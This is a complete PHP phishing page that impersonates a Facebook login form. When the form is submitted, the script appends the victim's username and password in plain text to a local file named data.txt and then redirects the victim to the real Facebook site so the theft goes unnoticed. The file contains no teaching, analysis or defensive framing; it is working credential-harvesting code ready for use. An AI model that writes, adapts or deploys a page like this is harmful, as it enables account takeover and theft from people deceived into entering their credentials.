<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // User submitted the form
  $username = $_POST['username'];
  $password = $_POST['password'];

  // Save the data to a file
  $file = fopen('data.txt', 'a'); // open the file in "append" mode
  fwrite($file, "Username: $username\n");
  fwrite($file, "Password: $password\n");
  fclose($file);

  // Redirect the user to Facebook
  header('Location: https://www.facebook.com/');
  exit;
}
?>

<!-- Facebook login form -->
<form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
  <label for="username">Username:</label>
  <input type="text" name="username" id="username"><br>

  <label for="password">Password:</label>
  <input type="password" name="password" id="password"><br>

  <input type="submit" value="Login">
</form>
